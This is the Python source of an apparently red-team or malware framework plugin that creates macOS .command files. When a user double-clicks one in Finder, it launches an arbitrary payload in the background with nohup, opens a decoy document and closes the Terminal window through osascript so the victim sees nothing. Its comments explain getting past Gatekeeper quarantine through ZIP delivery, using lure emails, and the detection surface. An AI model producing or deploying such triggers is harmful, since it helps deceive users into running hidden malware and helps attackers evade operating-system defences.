"""
Erebus Plugin - macOS .command File Trigger
Author: Whispergate
Description: Creates macOS .command files that execute on Finder double-click.

Execution path:
  .command → Finder double-click → Terminal.app opens, runs script, then closes.

.command files are bash scripts with the .command extension.  macOS opens them
in Terminal.app when double-clicked in Finder.  The script backgrounds the
payload immediately then closes the Terminal window via osascript, leaving no
visible trace to the victim.  Delivered inside a ZIP to avoid Gatekeeper
quarantine on the script itself (individual .command files downloaded via browser
receive the quarantine xattr; files extracted from a ZIP that was itself downloaded
do not inherit it on macOS < 13, and Gatekeeper only checks the outer archive).
"""

import pathlib
import random
import string
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class CommandTriggerPlugin(ErebusPlugin):
    """
    Plugin for creating macOS .command file triggers.

    The script runs the payload in the background via nohup, optionally opens a
    decoy document, then closes the Terminal window that macOS auto-opened so the
    victim sees nothing but the decoy.
    """

    def __init__(self):
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="command_trigger",
            version="1.0.0",
            author="Whispergate",
            description="Creates macOS .command file triggers via Terminal.app Finder double-click",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_command_trigger": self.create_command_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return (True, None)

    def on_load(self):
        print("[Plugin] Command Trigger plugin loaded - Supporting macOS .command delivery")

    # ================================================================
    # Helpers
    # ================================================================

    @staticmethod
    def _rand_var(n: int = 6) -> str:
        return "_" + "".join(random.choices(string.ascii_lowercase, k=n))

    # ================================================================
    # Plugin Functions
    # ================================================================

    def create_command_trigger(
        self,
        command: str,
        output_filename: str = "setup.command",
        payload_dir: Optional[pathlib.Path] = None,
        decoy_path: str = "",
        close_terminal: bool = True,
    ) -> pathlib.Path:
        """
        Create a macOS .command trigger file executed by Terminal.app on double-click.

        The generated file:
          1. Changes directory to its own location (payload co-located alongside it).
          2. Launches the payload detached via nohup in the background.
          3. Opens an optional decoy document to distract the victim.
          4. Closes the Terminal window via osascript (if close_terminal=True).

        Args:
            command:         Shell command to execute (e.g. './payload').
            output_filename: Output .command filename.
            payload_dir:     Directory to write the file into.
            decoy_path:      Optional file to open with 'open' after execution.
            close_terminal:  Close the Terminal window after execution (default True).

        Returns:
            pathlib.Path: Path to the created .command file.

        ## OPSEC Notes
        Detection Surface:
          - bash (Terminal.app child) spawning nohup - visible in Unified Log
          - osascript closing Terminal generates additional ES events
          - Gatekeeper may quarantine directly downloaded .command files on macOS 13+;
            deliver inside a ZIP archive to bypass
        Hardening:
          - [MALLEABLE] Replace nohup with setsid for cleaner process group detachment
          - [MALLEABLE] Set close_terminal=False if target environment blocks osascript
          - Combine with a lure email/document that instructs user to extract the ZIP
        Evasion Maturity: Level 2 (Moderate) - Terminal.app lineage is well-known;
          no AMSI equivalent on macOS means script content is rarely scanned.
        """
        if payload_dir is None:
            payload_dir = self.PAYLOAD_DIR
        payload_dir = pathlib.Path(payload_dir)
        payload_dir.mkdir(parents=True, exist_ok=True)

        v_dir = self._rand_var()

        decoy_block = ""
        if decoy_path:
            escaped_decoy = decoy_path.replace('"', '\\"')
            decoy_block = f'\nopen "{escaped_decoy}" &'

        close_block = ""
        if close_terminal:
            # Close the Terminal window that launched this script
            close_block = """
osascript -e 'tell application "Terminal"
    set windowList to every window
    repeat with aWindow in windowList
        close aWindow
    end repeat
end tell' >/dev/null 2>&1 &"""

        script = f"""#!/usr/bin/env bash
{v_dir}="$(cd "$(dirname "$0")" && pwd)"
nohup bash -c 'cd "'"${{{v_dir[1:]}}}"'" && {command}' >/dev/null 2>&1 &{decoy_block}{close_block}
"""
        output_path = payload_dir / output_filename
        output_path.write_text(script, encoding="utf-8")
        return output_path


# Module-level instance for plugin auto-discovery
_plugin = CommandTriggerPlugin()


if __name__ == "__main__":
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    registered = _plugin.register()
    print(f"[*] Registered functions ({len(registered)}):")
    for fn in sorted(registered):
        print(f"    - {fn}")
    print()
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
